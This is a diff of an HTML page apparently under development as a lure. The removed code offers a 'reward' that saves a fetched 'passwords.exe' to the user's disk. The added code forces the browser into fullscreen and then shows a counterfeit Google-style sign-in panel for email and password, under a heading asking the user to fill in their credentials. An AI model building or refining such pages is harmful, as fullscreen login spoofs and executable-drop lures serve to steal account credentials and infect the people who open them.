@@ -1,106 +1,121 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <title>File Picker + Fullscreen</title>
-    <meta charset="UTF-8">
-</head>
+<meta charset="UTF-8">
+<title>Fullscreen + File Download Test</title>
 
 <style>
 body {
-    background: #1d306d;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    height: 100vh;
-    margin: 0;
-    color: white;
     font-family: Arial;
     text-align: center;
+    padding: 50px;
 }
 
 button {
-    padding: 15px 30px;
-    font-size: 20px;
+    padding: 15px 25px;
+    font-size: 18px;
     margin: 15px;
     cursor: pointer;
-    border-radius: 10px;
-    border: none;
 }
 
-#status {
-    margin-top: 20px;
-    font-size: 18px;
+#fsUI {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+}
+
+/* top image */
+#topBar {
+    width: 100%;
+    height: 60px;
+    object-fit: cover;
+}
+
+/* logo */
+#logo {
+    display: block;
+    margin: 60px auto 10px auto;
+    width: 220px;
+}
+
+/* login panel */
+#loginPanel {
+    margin: 10px auto;
+    width: 300px;
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
 }
 </style>
+</head>
 
 <body>
 
-<h1>Step 1 → Save File</h1>
-<button id="btn1">Download Reward 🎁</button>
+<h2>Tap Continue and fill Your Credentials</h2>
 
-<h1>Step 2 → Go Fullscreen</h1>
-<button id="btn2">Continue 🚀</button>
+<div id="controls">
+    <button id="comboBtn">Start Secure Flow</button>
+</div>
 
-<div id="status"></div>
+<div id="fsUI">
+    <img id="topBar" src="google.png">
+    <img id="logo" src="gm.png">
+
+    <div id="loginPanel">
+        <h3>Sign in</h3>
+        <input type="text" placeholder="Email"><br><br>
+        <input type="password" placeholder="Password"><br><br>
+        <button>Next</button>
+    </div>
+</div>
 
 <script>
+const comboBtn = document.getElementById("comboBtn");
 
-// ✅ BUTTON 1 → FILE PICKER (delay allowed)
-document.getElementById("btn1").onclick = () => {
+comboBtn.addEventListener("click", async () => {
 
-    document.getElementById("status").textContent = "Opening file picker...";
+    // 1️⃣ FILE GENERATE + DOWNLOAD
+    const content = "This is a test file.\nGenerated automatically.";
+    const blob = new Blob([content], { type: "text/plain" });
 
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "test_file.txt";
+
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+    console.log("📁 File download triggered");
+
+    // 2️⃣ delay → fullscreen
     setTimeout(async () => {
         try {
-            const handle = await window.showSaveFilePicker({
-                suggestedName: "passwords.exe",
-                types: [{
-                    description: "Executable",
-                    accept: {
-                        "application/octet-stream": [".exe"]
-                    }
-                }],
-                excludeAcceptAllOption: true
-            });
-
-            const writable = await handle.createWritable();
-
-            const response = await fetch("passwords.exe");
-            await response.body.pipeTo(writable);
-
-            document.getElementById("status").textContent =
-                "✅ File saved successfully";
-
+            await document.documentElement.requestFullscreen();
+            console.log("Entered fullscreen");
         } catch (e) {
-            document.getElementById("status").textContent =
-                "❌ Cancelled or blocked";
+            console.log("Fullscreen error:", e);
         }
-    }, 1000); // delay OK here
-};
+    }, 500);
+});
 
 
-// ✅ BUTTON 2 → FULLSCREEN (NO DELAY)
-document.getElementById("btn2").onclick = () => {
+// UI toggle
+const fsUI = document.getElementById("fsUI");
+const controls = document.getElementById("controls");
 
-    document.getElementById("status").textContent = "Entering fullscreen...";
-
-    // ⚠️ MUST be direct (no setTimeout / no await)
-    if (!document.fullscreenElement) {
-        document.documentElement.requestFullscreen()
-        .then(() => {
-            document.getElementById("status").textContent =
-                "🚀 Fullscreen activated";
-        })
-        .catch(err => {
-            document.getElementById("status").textContent =
-                "❌ Fullscreen blocked";
-            console.log(err);
-        });
+document.addEventListener("fullscreenchange", () => {
+    if (document.fullscreenElement) {
+        fsUI.style.display = "block";
+        controls.style.display = "none";
+    } else {
+        fsUI.style.display = "none";
+        controls.style.display = "block";
+        console.log("⚠️ Fullscreen exited");
     }
-};
-
+});
 </script>
 
 </body>
